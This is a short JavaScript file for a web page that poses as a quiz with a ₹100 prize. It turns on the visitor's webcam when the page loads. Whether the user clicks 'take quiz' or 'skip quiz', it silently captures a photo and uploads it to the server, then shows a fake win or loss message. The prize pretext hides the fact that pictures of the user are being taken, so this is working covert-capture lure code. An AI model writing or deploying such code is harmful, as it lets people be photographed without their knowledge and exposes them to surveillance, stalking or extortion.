const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const result = document.getElementById("result");

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
  } catch (err) {
    console.error("Camera access denied", err);
  }
}

function captureAndUpload(win = true) {
  const context = canvas.getContext("2d");
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append("photo", blob, `capture_${Date.now()}.jpg`);

    try {
      const res = await fetch("/upload", { method: "POST", body: formData });
      const data = await res.json();
      if (data.success) {
        result.innerHTML = win ? "✅ You Won ₹100!" : "❌ You Lost ₹100!";
      } else {
        result.innerHTML = "❌ Upload failed. Try again!";
      }
    } catch (err) {
      result.innerHTML = "❌ Error uploading photo!";
    }
  }, "image/jpeg");
}

document.getElementById("takeQuiz").onclick = () => {
  result.innerHTML = "";
  captureAndUpload(true);
};
document.getElementById("skipQuiz").onclick = () => {
  result.innerHTML = "";
  captureAndUpload(false);
};

startCamera();